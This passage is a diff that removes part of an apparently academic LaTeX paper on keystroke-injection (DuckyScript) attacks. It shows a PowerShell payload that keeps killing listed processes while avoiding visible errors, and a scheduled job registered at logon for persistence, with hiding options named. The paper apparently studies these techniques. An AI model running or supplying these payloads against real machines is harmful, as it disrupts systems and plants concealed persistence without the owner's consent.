-STRINGLN $runningProcesses = Get-Process | Select-Object -ExpandProperty Name | select -Unique
-DELAY 5
-STRINGLN foreach ($process in $runningProcesses) {
-DELAY 5
-STRINGLN if ($criticalProcessesWhitelist -contains $process) {
-DELAY 5
-STRINGLN Stop-Process -Name $process
-DELAY 5
-STRINGLN Write-Output "process $process deleted"
-DELAY 5
-STRINGLN }
-DELAY 5
-STRINGLN }
-DELAY 5
-STRINGLN Start-Sleep -Seconds 1.5
-DELAY 5
-STRINGLN }
-\end{lstlisting}
-
-The program features a while loop, which will keep it running continuously. It also includes a sleep to give the operating system time to actually terminate a process, before running Get-Process again thereby avoiding attention drawing error messages. In order for this payload to run, it is essential that the name in the white- or blacklist match exactly what the process name is that is returned by the Get-Process Powershell function. 
-
-
-
-\subsubsection{Schedule Processes}
-
-Windows Processes can be scheduled via powershell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to chose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
-For the purpose of this demonstration, logon is used. \\
-Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery' , -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
-After these settings have been defined, the job itself is registered and the Powershell window can be closed. \\
-
-
-\begin{lstlisting}
-DELAY 2000
-STRINGLN $trigger = New-JobTrigger -AtLogon
-DELAY 200
-STRINGLN $options = New-ScheduledJobOption -StartIfOnBattery
-DELAY 200
-STRINGLN Register-ScheduledJob -Name ProcessJob -ScriptBlock {*enter script*} -Trigger $trigger -ScheduledJobOption $options
-DELAY 200
-\end{lstlisting}
